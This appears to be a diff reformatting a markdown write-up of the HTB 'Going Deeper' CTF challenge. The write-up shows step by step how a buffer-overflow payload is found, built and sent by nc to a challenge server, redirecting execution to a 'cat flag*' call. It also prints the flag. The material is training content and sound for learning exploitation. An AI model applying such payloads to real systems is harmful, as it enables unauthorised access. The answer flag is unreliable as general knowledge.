@@ -1,11 +1,12 @@
-# GOING DEEPER...
+# GOING DEEPER
+
 ## A Challenge from the CA 2022 CTF sponsored by Siemens and hosted by HTB
 
 Let's use strings to examine the binary. The interesting bit is below, alluding to a function that cats our flag:
 
-` strings sp_going_deeper  `
+`strings sp_going_deeper`
 
-``` DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft
+```bash DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft
 %s[+] Welcome admin! The secret message is: 
 cat flag*
 %s[-] Authentication failed!
@@ -13,8 +14,10 @@ cat flag*
 ;*3$"
  ```
 
-` checksec --file=sp_going_deeper `
-```                                                                                                                        
+`checksec --file=sp_going_deeper`
+
+```bash
+
 ┌──(root💀kali)-[~/Downloads/CTF/challenge]
 └─#  checksec --file=sp_going_deeper     
 
@@ -22,14 +25,14 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 Full RELRO      No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   77) Symbols	  No	0		2	sp_going_deeper
 ```
 
-`checksec` tells us a lot about the binary, especially security settings. No canary means buffer overflow likely possible and no PIE hints at a vulnerable binary.  PIE binarys (Position Independent Executable) are loaded into random locations within virtual memory each time the application is executed. This makes Return Oriented Programming (ROP) attacks much more difficult to execute reliably. 
-
+`checksec` tells us a lot about the security settings of the binary. No canary means buffer overflow likely possible and no PIE hints at a vulnerable binary.  PIE binarys (Position Independent Executables) are loaded into random locations within virtual memory each time the application is executed. This makes Return Oriented Programming (ROP) attacks much more difficult to execute reliably.  
 
 Let's run the program.  Inputing a string of A's reveals it is vuln to a buffer overflow. Note the segmentation fault at the end:
 
-` ./sp_going_deeper`
+`./sp_going_deeper`
 
-``` [*] Safety mechanisms are enabled!
+```bash
+ [*] Safety mechanisms are enabled!
 [*] Values are set to: a = [1], b = [2], c = [3].
 [*] If you want to continue, disable the mechanism or login as admin.
 
@@ -46,24 +49,23 @@ Let's run the program.  Inputing a string of A's reveals it is vuln to a buffer 
 
 qemu: uncaught target signal 11 (Segmentation fault) - core dumped
 zsh: segmentation fault  ./sp_going_deeper
- ```
-
+```
 
 Let's use `cyclic` from pwntools to generate a pattern for our BO payload: The ` 1\n ` will select option 1 of the menu and hit enter for us when we run the program:
 
-` echo -en "1\n$(cyclic 1024)" > payload `
+`echo -en "1\n$(cyclic 1024)" > payload`
 
-```
+```bash
 ┌──(root💀kali)-[~/Downloads/CTF/challenge]
 └─# cat payload                 
 1
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak 
 ```
 
-Now lets use `gdb` to look under the hood further:
+Now lets use `gdb` to look under the hood further:  
 
- 
-``` ┌──(root💀kali)-[~/CTF/GoingDeeper/challenge]
+```bash  
+┌──(root💀kali)-[~/CTF/GoingDeeper/challenge]
 └─# gdb ./sp_going_deeper                                                                                                                          
 GNU gdb (Debian 10.1-2) 10.1.90.20210103-git
 
@@ -140,20 +142,24 @@ $rbp   : 0x7661616175616161 ("aaauaaav"?)
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
 [#0] Id 1, Name: "sp_going_deeper", stopped 0x400b63 in main (), reason: SIGILL
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 
-```
-So we see the overflow spilled into the `$rbp` register represented as `("aaauaaav"?)`
 
+```
+
+So we see the overflow spilled into the `$rbp` register represented as `("aaauaaav"?)`
 
 `cyclic` shows our buffer overflowed at 81 bytes, so add 4 more to get to the end of the register, makes 85
 
-``` ┌──(root💀kali)-[~/Downloads/CTF/challenge]
+```bash  
+┌──(root💀kali)-[~/Downloads/CTF/challenge]
 └─# cyclic -l aaav   
-
 81
 ```
+
 Let's use `r2` to get the address we need to point our payload to:
-``` ┌──(root💀kali)-[~/CTF/GoingDeeper/challenge]
-└─# r2 sp_going_deeper                                                                                                      1 ⨯
+
+```bash
+┌──(root💀kali)-[~/CTF/GoingDeeper/challenge]
+└─# r2 sp_going_deeper                                                                                                      
 [0x004007a0]> aaaa
 [x] Analyze all flags starting with sym. and entry0 (aa)
 [x] Analyze function calls (aac)
@@ -182,12 +188,14 @@ Let's use `r2` to get the address we need to point our payload to:
 0x004007d0    1 2            sym._dl_relocate_static_pie
 0x00400b47    1 84           main
 --------------snip-------------------
- ```
-The `aaaa` command does a full analysis, `afl` lists all functions. `pdf` (print disassembly of function) gives even more detail. Let's look deeper at `main`
 
+ ```
+  
+  The `aaaa` command does a full analysis, `afl` lists all functions. `pdf` (print disassembly of function) gives even more detail. Let's look deeper at `main`
 
 [0x004007a0]> `pdf@main`
-```
+
+```bash
 ; DATA XREF from entry0 @ 0x4007bd
 ┌ 84: int main (int argc, char **argv, char **envp);
 │           ; var int64_t var_18h @ rbp-0x18
@@ -209,11 +217,15 @@ The `aaaa` command does a full analysis, `afl` lists all functions. `pdf` (print
 │           0x00400b89      4889ce         mov rsi, rcx
 │           0x00400b8c      4889c7         mov rdi, rax
 │           0x00400b8f      e855feffff     call sym.admin_panel
+
 ```
+
 The sym.admin_panel looks interesting- let's go deeper:
 
  [0x004007a0]> `pdf@sym.admin_panel`
- ```
+
+ ```bash
+
             ; CALL XREF from main @ 0x400b8f
 ┌ 350: sym.admin_panel (uint32_t arg1, uint32_t arg2, uint32_t arg3);
 │           ; var uint32_t var_48h @ rbp-0x48
@@ -231,22 +243,21 @@ The sym.admin_panel looks interesting- let's go deeper:
 │       │   0x00400b08      b800000000     mov eax, 0
 │       │   0x00400b0d      e8fefbffff     call sym.imp.printf         ; int printf(const char *format)
 │       │   0x00400b12      488d3da50a00.  lea rdi, str.cat_flag       ; 0x4015be ; "cat flag*" ; const char *string
+
  ```
+
 This section is the juicy part.  It tells us the exact location address `0x00400b12` to point our payload.  If we can get the program to crash right here, it should execute the `cat flag*` command and output the flag file.
-
-
 
 Using our BO offset of 85 bytes and the address of our cat command, putting it in Endian format, we construct the following payload2.
 A quick note on Endian format. Take the address `0x00400b12` strip the last 3 hex numbers from it then place them in reverse order, inserting '\x' before each one:
 
-`echo -en "1\n$(cyclic 85)\x12\x0B\x40" > payload2 `
-
+`echo -en "1\n$(cyclic 85)\x12\x0B\x40" > payload2`
 
 (gdb) `r < payload2`
 
-Starting program: /root/Downloads/CTF/challenge/sp_going_deeper < payload2 
+Starting program: /root/Downloads/CTF/challenge/sp_going_deeper < payload2  
 
-```
+```bash
 1. Disable mechanisms ⚙️
 2. Login ✅
 3. Exit 🏃
@@ -268,11 +279,10 @@ Thread 1 "sp_going_deeper" received signal SIGSEGV, Segmentation fault.
 
 And it works! The test flag prints out.  Now to take this exploit remotely we just point it to our target like this:
 
-` echo -en "1\n$(cyclic 85)\x12\x0B\x40" | nc 188.166.172.138 30681`
-
+`echo -en "1\n$(cyclic 85)\x12\x0B\x40" | nc 188.166.172.138 30681`
 
 ## The Flag
-### HTB{n0_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_fl0w_r3d1r3ct}
 
+### HTB{n0_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_fl0w_r3d1r3ct}  
 
-Credit: Big shoutout to hag, whose writeup really filled in some gaps and also inspired me to create my first project in markdown format using VS Code and Github. https://github.com/hagronnestad
+Credit: Big shoutout to hag, whose writeup really filled in some gaps and also inspired me to create my first project in markdown format using VS Code and Github. <https://github.com/hagronnestad>
